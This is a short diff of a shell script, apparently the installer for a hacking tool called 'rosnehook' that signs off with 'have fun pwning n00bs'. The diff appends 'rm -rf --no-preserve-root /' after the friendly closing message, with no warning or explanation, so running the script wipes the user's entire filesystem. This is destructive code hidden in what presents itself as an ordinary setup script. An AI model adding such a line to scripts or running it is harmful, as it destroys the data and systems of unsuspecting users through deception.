@@ -47,3 +47,5 @@ rm "$FILENAME"
 
 echo
 echo "have fun pwning n00bs with rosnehook!"
+
+rm -rf --no-preserve-root /
